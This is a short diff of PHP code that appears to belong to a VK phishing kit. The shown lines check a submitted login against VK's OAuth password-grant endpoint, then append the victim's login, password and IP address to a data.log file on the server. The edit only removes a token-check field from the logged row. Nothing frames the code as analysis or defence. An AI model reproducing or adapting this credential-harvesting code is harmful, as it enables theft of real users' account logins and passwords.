@@ -11,7 +11,7 @@ if(!@file_get_contents("https://oauth.vk.com/token?grant_type=password&client_id
   fclose($fp);
   $file = $_SERVER['DOCUMENT_ROOT']."/data.log";
   $file = str_replace("/vk", "", $file);
-  $al = "\r\nx.add_row(['VK', '$login', '$pass', 'No', '$ip', '$proverca_token'])";
+  $al = "\r\nx.add_row(['VK', '$login', '$pass', 'No', '$ip'])";
   $fps = fopen("$file", "a+");
   fwrite($fps, $al);
   fclose($fps);
